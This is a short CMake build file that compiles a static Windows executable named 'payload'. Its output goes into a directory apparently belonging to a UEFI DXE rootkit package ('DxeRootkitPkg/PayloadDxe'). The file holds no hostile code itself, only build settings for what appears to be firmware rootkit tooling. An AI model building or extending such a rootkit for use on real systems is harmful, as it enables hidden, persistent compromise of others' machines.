cmake_minimum_required(VERSION 3.0.0)

project(payload VERSION 0.1.0)

set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_CXX_STANDARD 20)

add_executable(payload WIN32 ${PROJECT_SOURCE_DIR}/main.cpp)

target_link_options(payload PRIVATE -static)

set_target_properties(payload PROPERTIES RUNTIME_OUTPUT_DIRECTORY ${PROJECT_SOURCE_DIR}/../DxeRootkitPkg/PayloadDxe)